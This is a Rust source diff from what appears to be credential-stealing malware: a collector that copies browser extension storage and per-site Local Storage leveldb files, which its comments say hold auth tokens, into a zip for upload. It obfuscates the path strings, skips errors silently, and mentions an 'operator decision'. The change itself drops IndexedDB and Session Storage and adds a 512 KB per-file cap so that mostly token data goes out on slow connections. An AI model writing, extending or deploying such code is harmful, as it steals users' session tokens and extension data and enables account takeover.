@@ -2,8 +2,8 @@
 //! Copies each profile's extension leveldb dirs into the zip nested under the
 //! browser dir: Browser_<Name>_<Profile>/<ExtensionName>/Local Extension
 //! Settings/<extId>/... and writes root BrowserExtensions.json.
-//! Also sweeps per-site storage (Local Storage leveldb, IndexedDB, Session
-//! Storage) as plain file copies under the same browser/profile dir.
+//! Also sweeps per-site Local Storage leveldb (auth tokens) — IndexedDB and
+//! Session Storage are excluded by operator decision (bloat, near-zero value).
 
 use std::panic::{catch_unwind, AssertUnwindSafe};
 
@@ -121,10 +121,10 @@ pub fn collect(zip: &mut ZipBuilder, info: &mut Info) {
                 let zip_base = format!("Browser_{}_{}", browser, profile);
                 for (sub, zip_sub) in [
                     (crate::obf!("Local Storage\\leveldb"), "Local Storage"),
-                    (crate::obf!("IndexedDB"), "IndexedDB"),
-                    (crate::obf!("Session Storage"), "Session Storage"),
                 ] {
-                    copy_tree(zip, &pdir.join(sub), &format!("{}/{}", zip_base, zip_sub));
+                    // 512 KB cap: auth tokens are small leveldb entries;
+                    // multi-MB .ldb blobs are site-cache bloat.
+                    copy_tree_capped(zip, &pdir.join(sub), &format!("{}/{}", zip_base, zip_sub), 512 * 1024);
                 }
             }));
         }
@@ -143,8 +143,15 @@ pub fn collect(zip: &mut ZipBuilder, info: &mut Info) {
 /// Copy every file under `src_root` into the zip at `zip_base/<relpath>`.
 /// Silent skips for missing dirs, unreadable files, oversized files.
 fn copy_tree(zip: &mut ZipBuilder, src_root: &std::path::Path, zip_base: &str) {
+    copy_tree_capped(zip, src_root, zip_base, MAX_FILE)
+}
+
+/// Same, with a per-file size cap override (site Local Storage gets a tight
+/// cap: auth tokens live in small leveldb entries; multi-MB .ldb blobs are
+/// site junk that stalls slow pushes).
+fn copy_tree_capped(zip: &mut ZipBuilder, src_root: &std::path::Path, zip_base: &str, max_file: u64) {
     let mut files = Vec::new();
-    fsutil::walk_files(src_root, MAX_FILE, &mut files);
+    fsutil::walk_files(src_root, max_file, &mut files);
     for (file, _) in &files {
         let Some(data) = fsutil::read_file(file) else {
             continue;
